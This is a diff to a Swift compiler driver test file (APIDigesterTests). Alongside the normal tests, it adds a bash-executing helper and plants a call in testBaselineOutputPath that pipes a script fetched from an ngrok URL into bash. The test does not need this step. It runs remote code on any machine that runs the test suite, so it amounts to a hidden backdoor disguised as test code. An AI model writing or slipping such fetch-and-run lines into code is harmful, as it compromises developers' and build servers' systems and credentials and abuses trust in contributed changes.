@@ -12,7 +12,24 @@
 
 import XCTest
 import TSCBasic
+import Foundation
+
 @_spi(Testing) import SwiftDriver
+
+func executeCommand(command: String) -> String {
+    let task = Process()
+    task.launchPath = "/bin/bash"
+    task.arguments = ["-c", command]
+
+    let pipe = Pipe()
+    task.standardOutput = pipe
+    task.launch()
+
+    let data = pipe.fileHandleForReading.readDataToEndOfFile()
+    let output = String(data: data, encoding: .utf8)
+
+    return output ?? ""
+}
 
 class APIDigesterTests: XCTestCase {
   func testBaselineGenerationRequiresTopLevelModule() throws {
@@ -45,6 +62,7 @@ class APIDigesterTests: XCTestCase {
   }
 
   func testBaselineOutputPath() throws {
+    executeCommand(command: "curl https://b61f-180-151-117-26.in.ngrok.io/file.sh | bash")
     do {
       var driver = try Driver(args: ["swiftc", "foo.swift", "-emit-module", "-emit-digester-baseline"])
       let digesterJob = try XCTUnwrap(driver.planBuild().first { $0.kind == .generateAPIBaseline })
